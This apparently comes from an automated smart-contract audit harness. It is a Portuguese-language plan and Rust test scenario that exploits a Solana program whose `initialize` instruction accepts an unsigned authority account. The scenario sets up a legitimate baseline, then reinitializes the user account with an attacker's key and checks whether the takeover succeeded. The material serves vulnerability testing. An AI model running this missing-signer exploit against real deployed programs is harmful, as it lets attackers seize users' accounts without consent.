attempts.raw:
{
  "plan": "O programa native `initialize` recebe duas contas: `user` (gravável, 32 bytes) e `authority_info`. Ele grava `authority_info.key` em `user.authority` sem verificar `is_signer`. O baseline chama `initialize` com a autoridade legítima assinando, provando que o cenário está montado. O ataque repete a mesma chamada, mas com uma chave de atacante como `authority_info` sem assinatura; o efeito mede se `user.authority` passou a ser a chave do atacante, demonstrando que a conta foi tomada sem consentimento.",
  "scenario": "let user_key = Pubkey::new_unique();
let legit_authority = Pubkey::new_unique();
let attacker_authority = Pubkey::new_unique();

let user_account = account(&env.program_id, &[0u8; 32], None);
let legit_authority_account = wallet(1_000_000_000);
let attacker_authority_account = wallet(1_000_000_000);

let metas = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(legit_authority, true),
];
let ix = env.raw_ix(&(), metas);
let contas = vec![
    (user_key, user_account.clone()),
    (legit_authority, legit_authority_account.clone()),
];
let baseline = env.baseline("initialize legitimo com autoridade assinando", &ix, &contas);

let user_after_baseline = after(&baseline, &user_key).clone();

let attack_metas = vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(attacker_authority, false),
];
let attack_ix = env.raw_ix(&(), attack_metas);
let attack_contas = vec![
    (user_key, user_after_baseline),
    (attacker_authority, attacker_authority_account),
];
let r = env.attack("initialize com autoridade do atacante sem assinatura", &attack_ix, &attack_contas);

if r.program_result == ProgramResult::Success {
    let authority_gravada = read_pubkey(after(&r, &user_key).data(), 0);
    env.effect("user.authority foi definida como a chave do atacante sem assinatura", authority_gravada == attacker_authority);
}"
}

